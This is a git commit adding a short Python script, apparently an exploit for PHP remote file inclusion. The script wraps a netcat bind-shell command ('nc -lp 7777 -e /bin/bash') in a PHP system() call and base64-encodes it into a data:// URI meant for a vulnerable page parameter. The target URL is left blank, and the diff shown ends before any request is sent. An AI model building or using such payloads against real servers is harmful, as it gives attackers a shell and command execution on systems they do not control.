321331a33c675bd444211b92f6d8770142dba470
Christian Urcuqui <ulcamilo@gmail.com>
2016-12-03 00:23:47 -0500

    remote file intrusion php

---
+++ php/remote_file_intrusion.py
@@ -0,0 +1,19 @@
+import requests
+import sys
+
+# url parameter with a RFI vulnerable
+# example http://w.com/fi/?page=
+url = ("")
+
+# netcat, port 7777
+
+command = """nc -lp 7777 -e /bin/bash &"""
+cod = """<?php system('%s'); ?>""" % command
+
+# by base64
+
+codeb64 = cod.encode('base64')
+dataw = """data://text/plain;base64,""" +str(codeb64)
+
+
+
